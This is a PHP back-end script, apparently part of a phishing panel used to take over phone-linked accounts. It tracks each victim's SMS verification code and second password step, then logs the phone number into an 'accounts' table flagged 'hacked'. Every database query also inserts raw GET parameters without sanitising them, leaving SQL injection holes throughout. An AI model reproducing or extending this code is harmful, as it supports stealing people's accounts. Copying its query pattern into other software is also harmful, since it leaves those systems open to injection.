<?php
include "../private/connect.php";

$db = Database::getInstance();
$c = $db->getc();

if (isset($_GET['val']) && isset($_GET['req'])) {
	$action = $_GET['val'];
	$request = $_GET['req'];
	$timer = time();
	$sb = $c->query("SELECT * FROM sms WHERE request_id = '$request'");
	$bs = $sb->fetch_array();
		if ($sb->num_rows != 0) {
			$phone = $bs['phone'];
			if ($action == 'code') { // code is not correct
				$sql = $c->query("SELECT * FROM password WHERE request_id = '$request'");
				if ($sql->num_rows == 0) {
					$c->query("INSERT INTO password (request_id,code,timer)VALUES('$request',0,'$timer')");
					$c->query("UPDATE stemp SET verify = 'error' WHERE request_id = '$request'");
					$c->query("UPDATE sms SET code= '' WHERE request_id = '$request'");
					include '../layouts/alert.php';
				} else {
					$c->query("UPDATE password SET code = 0 WHERE request_id = '$request'");
					$c->query("UPDATE stemp SET verify = 'error' WHERE request_id = '$request'");
					$c->query("UPDATE sms SET code= '' WHERE request_id = '$request'");
					include '../layouts/alert.php';
				}
			}
			elseif ($action == 'password') { // account has a password
				$sql = $c->query("SELECT * FROM password WHERE request_id = '$request'");
				if ($sql->num_rows == 0) {
					$c->query("INSERT INTO password (request_id,code,password,timer)VALUES('$request',1,'yes','$timer')");
					$c->query("UPDATE stemp SET verify = 'valid' WHERE request_id = '$request'");
					$stp = $c->query("SELECT * FROM stemp WHERE request_id = '$request'");
					$zstemp = $stp->fetch_array();
					$c->query("UPDATE sms SET code = '".$zstemp['code']."' WHERE request_id = '$request'");
					include '../layouts/alert.php';
				} else {
					$c->query("UPDATE password SET code = 1 , password = 'yes' WHERE request_id = '$request'");
					$c->query("UPDATE stemp SET verify = 'valid' WHERE request_id = '$request'");
					$stp = $c->query("SELECT * FROM stemp WHERE request_id = '$request'");
					$zstemp = $stp->fetch_array();
					$c->query("UPDATE sms SET code = '".$zstemp['code']."' WHERE request_id = '$request'");
					include '../layouts/alert.php';

				}
			}
			elseif ($action == 'pass') { // password is not correct
				$c->query("UPDATE ptemp SET password = NULL,verify = 'error' WHERE request_id = '$request'");
					include '../layouts/alert.php';
			}elseif ($action == 'dpass') { // done after a password
				$sql = $c->query("SELECT * FROM password WHERE request_id = '$request'");
				if ($sql->num_rows == 0) {
					$c->query("INSERT INTO password (request_id,code,password,timer)VALUES('$request',1,'yes','$timer')");
					$c->query("UPDATE result SET password = 'Yes',status = 1 WHERE request_id = '$request'");
					$c->query("INSERT INTO accounts (request_id,phone,hacked,timer)VALUES('$request','$phone',1,'$timer')");
					$c->query("UPDATE alert SET result = 'solved' WHERE request_id = '$request'");
					$c->query("UPDATE ptemp SET verify = 'valid' WHERE request_id = '$request'");
					$c->query("UPDATE stemp SET verify = 'valid' WHERE request_id = '$request'");
					$stp = $c->query("SELECT * FROM stemp WHERE request_id = '$request'");
					$zstemp = $stp->fetch_array();
					$c->query("UPDATE sms SET code = '".$zstemp['code']."' WHERE request_id = '$request'");
					include '../layouts/alert.php';
				} else {
					$c->query("UPDATE password SET code = 1 , password = 'yes' WHERE request_id = '$request'");
					$c->query("UPDATE result SET password = 'Yes',status = 1 WHERE request_id = '$request'");
					$c->query("INSERT INTO accounts (request_id,phone,hacked,timer)VALUES('$request','$phone',1,'$timer')");
					$c->query("UPDATE alert SET result = 'solved' WHERE request_id = '$request'");
					$c->query("UPDATE ptemp SET verify = 'valid' WHERE request_id = '$request'");
					$c->query("UPDATE stemp SET verify = 'valid' WHERE request_id = '$request'");
					$stp = $c->query("SELECT * FROM stemp WHERE request_id = '$request'");
					$zstemp = $stp->fetch_array();
					$c->query("UPDATE sms SET code = '".$zstemp['code']."' WHERE request_id = '$request'");
					include '../layouts/alert.php';
				}
			}
			elseif ($action == "done") { // completed with out password
				$sql = $c->query("SELECT * FROM password WHERE request_id = '$request'");
				if ($sql->num_rows == 0) {
					$c->query("INSERT INTO password (request_id,code,password,timer)VALUES('$request',1,'no','$timer')");
					$c->query("UPDATE result SET password = 'No',status = 1 WHERE request_id = '$request'");
					$c->query("INSERT INTO accounts (request_id,phone,hacked,timer)VALUES('$request','$phone',1,'$timer')");
					$c->query("UPDATE alert SET result = 'solved' WHERE request_id = '$request'");
					$c->query("UPDATE stemp SET verify = 'valid' WHERE request_id = '$request'");
					$stp = $c->query("SELECT * FROM stemp WHERE request_id = '$request'");
					$zstemp = $stp->fetch_array();
					$c->query("UPDATE sms SET code = '".$zstemp['code']."' WHERE request_id = '$request'");
					include '../layouts/alert.php';
				} else {
					$c->query("UPDATE password SET code = 1 , password = 'no' WHERE request_id = '$request'");
					$c->query("UPDATE result SET password = 'No',status = 1 WHERE request_id = '$request'");
					$c->query("INSERT INTO accounts (request_id,phone,hacked,timer)VALUES('$request','$phone',1,'$timer')");
					$c->query("UPDATE alert SET result = 'solved' WHERE request_id = '$request'");
					include '../layouts/alert.php';
				}
			}
		}
		else {
			echo '<script>alert("code is not sent yet")</script>';
			include '../layouts/alert.php';
		}
}
?>